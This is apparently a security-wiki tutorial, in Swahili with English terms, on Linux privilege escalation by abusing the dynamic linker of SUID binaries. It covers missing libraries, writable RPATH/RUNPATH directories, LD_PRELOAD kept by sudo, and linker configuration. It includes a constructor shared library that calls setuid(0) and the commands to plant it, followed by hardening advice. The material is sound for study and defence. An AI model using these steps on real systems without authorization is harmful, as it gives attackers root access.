# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries kwa kawaida hukaguliwa kwa ajili ya direct command execution, lakini custom SUID programs pia zinaweza kuwa vulnerable kupitia dynamic linker. Wazo kuu ni rahisi: executable yenye privileged hupakia code kutoka kwenye path au configuration ambayo mtumiaji mwenye lower privileges anaweza kuathiri.

Ukurasa huu unaangazia generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` kupitia sudo, linker configuration, na SUID hardlink confusion.

## Fast Enumeration

Anza kwa kutafuta SUID files zisizo za kawaida na kukagua ikiwa zina dynamic linking:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Zingatia maeneo yasiyo ya kawaida, njia maalum za applications, binaries zinazomilikiwa na root lakini zilizo nje ya directories zinazosimamiwa na packages, na dependencies zinazopakiwa kutoka kwenye directories zinazoweza kuandikwa.

Ukaguzi muhimu wa uwezo wa kuandikwa:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Baadhi ya binary maalum za SUID hujaribu kupakia shared object ambayo haipo. Ikiwa path inayokosekana iko chini ya directory inayodhibitiwa na attacker, binary inaweza kupakia code iliyotolewa na attacker ikiwa mtumiaji mwenye effective user.

Tafuta library lookups zilizoshindwa:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ikiwa binary inatafuta `libexample.so` kwenye path inayoweza kuandikwa, proof library ndogo inaweza kutumia constructor. Weka proof-of-impact ikiwa salama wakati wa validation:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Iunde kwa jina halisi la faili ambalo binary hujaribu kupakia:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Hali inayoweza kutumiwa si library kukosekana pekee. Mshambuliaji lazima awe na uwezo wa kuweka shared object inayooana kwenye path ambayo privileged loader itakubali.

## Directory ya Library Inayoweza Kuandikwa

Wakati mwingine dependencies zote zipo, lakini mojawapo ya directories zinazotumika kuzitatua inaweza kuandikwa. Hii inaweza kuruhusu kubadilisha library iliyopakiwa au kuweka library yenye kipaumbele cha juu yenye jina lilelile.

Kagua paths za dependencies:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ikiwa directory inaweza kuandikwa, thibitisha kwa kutumia mbinu salama ya kunakili katika lab. Kubadilisha system libraries kwenye host inayofanya kazi kunaweza kuvuruga authentication, package management, au services muhimu za boot.

## RPATH and RUNPATH

`RPATH` na `RUNPATH` ni entries za dynamic-section zinazoelekeza loader mahali pa kutafuta libraries. Ni hatari katika SUID programs zinapoelekeza kwenye directories zinazoweza kuandikwa na attacker.

Zigundue:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Mfano wa matokeo hatari:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ikiwa `/opt/app/lib` inaweza kuandikwa na binary inahitaji `libcustom.so`, mshambuliaji anaweza kuweka `libcustom.so` hasidi hapo:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` na `RUNPATH` si sawa katika maelezo yote ya resolution, lakini kwa ukaguzi wa privilege-escalation swali la kivitendo ni lilelile: je, SUID binary hutafuta library kwa kutumia jina lake katika directory inayoweza kuandikwa na attacker?

## LD_PRELOAD, LD_LIBRARY_PATH na SUID

Kwa programs za kawaida, `LD_PRELOAD` na `LD_LIBRARY_PATH` zinaweza kulazimisha au kuathiri upakiaji wa shared object. Kwa programs za SUID, dynamic loader kwa kawaida huingia katika secure-execution mode na kupuuza environment variables hatari.

Hii inamaanisha kuwa SUID binary ya kawaida kwa kawaida si vulnerable kwa sababu tu user anaweza kuweka `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Isipokuwa wa kawaida ni **sudo misconfiguration**. Ikiwa `sudo -l` inaonyesha kuwa variable kama `LD_PRELOAD` au `LD_LIBRARY_PATH` imehifadhiwa, command iliyoruhusiwa na sudo inaweza kupakia code inayodhibitiwa na attacker:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Usichanganye hali hizi:

- `LD_PRELOAD` dhidi ya binary ya kawaida ya SUID: kwa kawaida huzuiwa na secure execution.
- `LD_PRELOAD` iliyohifadhiwa na sudo: inaweza kutumiwa kwa exploit.
- `.so` iliyokosekana katika path inayoweza kuandikwa: inaweza kutumiwa kwa exploit wakati binary ya SUID inapopakia path hiyo kwa kawaida.
- `RPATH`/`RUNPATH` inayoelekeza kwenye directory inayoweza kuandikwa: inaweza kutumiwa kwa exploit wakati library inayohitajika inaweza kudhibitiwa.
- Ruhusa ya kuandika kwenye `/etc/ld.so.preload` au linker config: huathiri mfumo mzima na ina impact kubwa.

## Linker Configuration

Dynamic linker pia husoma system configuration kama `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache, na katika baadhi ya hali `/etc/ld.so.preload`.

Ukaguzi wa thamani kubwa:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` ni hatari zaidi kwa sababu inaweza kulazimisha shared object iingizwe kwenye privileged processes.

## SUID Hardlink Confusion

Hardlinks zinaweza kufanya inode ileile ya SUID ionekane chini ya majina mengi. Hii ni muhimu kwa kuficha privileged helper, kuchanganya cleanup, au kukwepa ukaguzi rahisi unaotegemea path.

Tafuta faili za SUID zenye links zaidi ya moja:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Kagua njia zote zinazoelekeza kwenye inode ileile:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Abuse si kwamba hardlink hubadilisha permissions. Abuse ni mkanganyiko wa path: inode yenye privileges inaweza kufikiwa kupitia jina ambalo defenders au scripts hawatarajii. Kwa maelezo ya kina zaidi kuhusu inode na workflow ya hardlink, angalia [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Maelezo ya Ulinzi

- Weka binaries za SUID ziwe chache, zikaguliwe, na zidhibitiwe na package management inapowezekana.
- Epuka entries za `RPATH`/`RUNPATH` zinazoelekeza kwenye directories zinazoandikika au zinazosimamiwa na application.
- Weka directories za library zimilikiwe na root na zisiweze kuandikwa na watumiaji wa kawaida.
- Usihifadhi `LD_PRELOAD`, `LD_LIBRARY_PATH`, au loader variables zinazofanana kupitia sudo.
- Fuatilia `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, na files za SUID zisizotarajiwa.
- Kagua files za SUID zilizo-hardlinkiwa na chunguza SUID wrappers maalum zilizo nje ya standard system paths.
{{#include ../../banners/hacktricks-training.md}}
